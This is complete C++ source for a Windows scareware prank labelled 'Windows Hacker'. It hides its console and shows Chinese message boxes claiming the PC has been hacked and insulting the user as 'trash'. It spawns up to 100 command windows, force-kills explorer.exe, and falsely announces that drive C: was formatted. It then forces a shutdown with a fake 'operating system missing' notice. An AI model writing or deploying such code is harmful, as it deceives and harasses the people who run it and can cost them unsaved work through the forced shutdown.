#include<cstdio>
#include<windows.h>
using namespace std;

int Res;

DWORD WINAPI First_Message(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"你的电脑已经被我入侵了，\n说，你是不是垃圾!\n你只有 5 秒时间回答。","Windows Hacker",4);
    
    return 0L;
}
DWORD WINAPI Second_Message(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"不听话是吧，再问你一遍，你是不是垃圾!\n你只有 5 秒时间回答。","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI Third_Message(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"最后问你一次，你是不是垃圾!\n你只有 5 秒时间回答。","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI First_Warning(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"快点回答！\n你是不是垃圾！\n不说就帮你自动选择。","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI Second_Warning(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"小蜗牛，快点！\n你是不是垃圾！\n不说就帮你自动选择。","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI Third_Warning(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"你还不说是吧！\n你是不是垃圾！\n不说就帮你自动选择。","Windows Hacker",4);
    return 0L;
}

int main()
{
	HWND hwnd; if(hwnd=::FindWindow("ConsoleWindowClass",NULL)) 
	{
		::ShowWindow(hwnd,SW_HIDE); 
	}
	
	HANDLE hThread_1 = CreateThread(NULL, 0, First_Message, NULL, 0, NULL);
	CloseHandle(hThread_1);
	Sleep(5000);
	
	Flag_1:
		if(Res==6)
		{
			Res=0;
			MessageBox(NULL,"啊，对对对。","Windows Hacker",0);
			for(int i=30;i>=1;i--)
				MessageBox(NULL,"你个垃圾！","Windows Hacker",0);
			MessageBox(NULL,"你很有诚意啊！","Windows Hacker",0);
			return 0;
		}
		else if(Res==0)
		{
			HANDLE hThread_W1 = CreateThread(NULL, 0, First_Warning, NULL, 0, NULL);
			CloseHandle(hThread_W1);
			Sleep(5000);
			if(Res==0) Res=7;
			goto Flag_1;
		}
		else
		{
			Res=0;
			for(int i=1;i<=30;i++) system("Start");
			Sleep(1000);
			HANDLE hThread_2 = CreateThread(NULL, 0, Second_Message, NULL, 0, NULL);
			CloseHandle(hThread_2);
			Sleep(5000);
			
			Flag_2:
				if(Res==6)
				{
					Res=0;
					MessageBox(NULL,"啊，对对对。","Windows Hacker",0);
					for(int i=50;i>=1;i--)
						MessageBox(NULL,"你个垃圾！","Windows Hacker",0);
					MessageBox(NULL,"你很有诚意啊！","Windows Hacker",0);
					return 0;
				}
				else if(Res==0)
				{
					HANDLE hThread_W2 = CreateThread(NULL, 0, Second_Warning, NULL, 0, NULL);
					CloseHandle(hThread_W2);
					Sleep(5000);
					if(Res==0) Res=7;
					goto Flag_2;
				}
				else
				{
					Res=0;
					for(int i=1;i<=100;i++) system("Start");
					Sleep(3000); 
					HANDLE hThread_3 = CreateThread(NULL, 0, Third_Message, NULL, 0, NULL);
					CloseHandle(hThread_3);
					Sleep(5000);
					
					Flag_3:
						if(Res==6)
						{
							MessageBox(NULL,"啊，对对对。","Windows Hacker",0);
							for(int i=100;i>=1;i--)
								MessageBox(NULL,"你个垃圾！","Windows Hacker",0);
							MessageBox(NULL,"你很有诚意啊！","Windows Hacker",0);
							return 0;
						}
						else if(Res==0)
						{
							HANDLE hThread_W3 = CreateThread(NULL, 0, Third_Warning, NULL, 0, NULL);
							CloseHandle(hThread_W3);
							Sleep(5000);
							if(Res==0) Res=7;
							goto Flag_3;
						}
						else
						{
							MessageBox(NULL,"你完了，别怪我没警告你。","Windows Hacker",0);
							Sleep(6000);
							system("taskkill /im Explorer.exe /f");
							Sleep(2000);
							MessageBox(NULL,"格式化驱动器 C:/ 成功","Windows Hacker",0);
							system("Shutdown -s -t 10 -c 由于您的操作系统缺失，所以将自动关机\n详情请联系电脑设备制造商或微软官方。");
							return 0;
						}
				}
		}
		
		return 0;
}
